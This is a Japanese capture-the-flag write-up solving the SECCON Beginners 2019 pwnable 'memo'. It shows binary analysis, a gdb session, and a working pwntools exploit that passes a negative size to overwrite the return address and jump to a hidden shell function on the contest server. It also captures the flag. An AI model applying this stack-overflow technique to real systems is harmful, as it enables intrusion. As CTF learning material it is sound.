# はじめに
2019年5月25日〜26日、Szarnyさんと一緒SECCONのCTF For Beginners (ctf4b)に参加し、最後に二人のチームが2707ポイントを集め、666チームが参加する中26位で終わりました。

今回、解けた問題「memo」の解法を紹介していきます。
# memo
いつもどおりにセキュリティ機構の有無を確認します。
```
$ checksec memo
[*] '/ctf/SECCON2019-ctf4b/take2/Pwnable/memo/memo'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`radare2`で解析を始めましょう。関数一覧を出したら、謎の関数がありました。
```
/ (fcn) sym.hidden 26
|   sym.hidden ();
|           0x004007bd      55             push rbp
|           0x004007be      4889e5         mov rbp, rsp
|           0x004007c1      488d3dce0000.  lea rdi, [0x00400896]
|           0x004007c8      e8c3fdffff     call sym.imp.system
|           0x004007cd      bf00000000     mov edi, 0
\           0x004007d2      e8f9fdffff     call sym.imp.exit
```
簡単に言うと`system("/bin/sh"); exit(0);`とする関数ですね。というわけでこれを実行すれば勝ち。

メインプログラムの動作を言葉でまとめますが、実行すると入力サイズを求め、`0x1f`(31)であることをチェックします。合格の場合、サイズがラウンディングされ、その結果を`rsp`から引き、最後の結果を読み込み先として`fgets`を呼び出します。一応に適当なサイズを与えて、`rsp`以下なら任意書き込みができますが、もし負数を与えるとしたら、`rsp`から引かれて、`rsp`以上のアドレスも書き込むことが可能になります！

gdbでプログラムを実行し、引き算の前にブレークポイントを入れて`rsp`の値を確認しましょう。
```
pwndbg> b *0x000000000040075f
Breakpoint 1 at 0x40075f
pwndbg> r
Starting program: /ctf/SECCON2019-ctf4b/take2/Pwnable/memo/memo 
Input size : -1

Breakpoint 1, 0x000000000040075f in main ()
...
 RBP  0x7fffffffe440 —▸ 0x4007e0 (__libc_csu_init) ◂— push   r15
 RSP  0x7fffffffe3f0 ◂— 0xa312d /* '-1\n' */
...
pwndbg> p $rbp-$rsp
$1 = 80
```
ラウンディング数式が自分にはちょっとわかりにくいけど、とにかく`-0x60`(-96)の値を渡すと`$rax`が`-80`になり、更に`$rsp`から引くと`$rsp == $rbp`となる。すなわち、サイズを`-96`に指定すれば、fgetsの読み込み先がスタックの`$rbp`に移動され、8バイト後リターンポインタを上書きすることが出来ます。
```
#!/usr/bin/env python2
from pwn import *

SERVER = True
if SERVER:
        p = remote("133.242.68.223", 35285)
else:
        p = process("./memo")

p.sendlineafter(": ", "-96")                       # -0x60
p.sendlineafter(": ", p64(0x0) + p64(0x004007c1))  # @sym.hidden + 0x4

p.interactive()

p.close()
```
```
$ ./exploit.py 
[+] Opening connection to 133.242.68.223 on port 35285: Done
[*] Switching to interactive mode
Your Content : 1�I��^H\x89�H���PTI��@
$ cat flag.txt
ctf4b{h4ckn3y3d_574ck_b0f}
$  
```

以上 memo の解法でした。読んで頂き、ありがとうございました！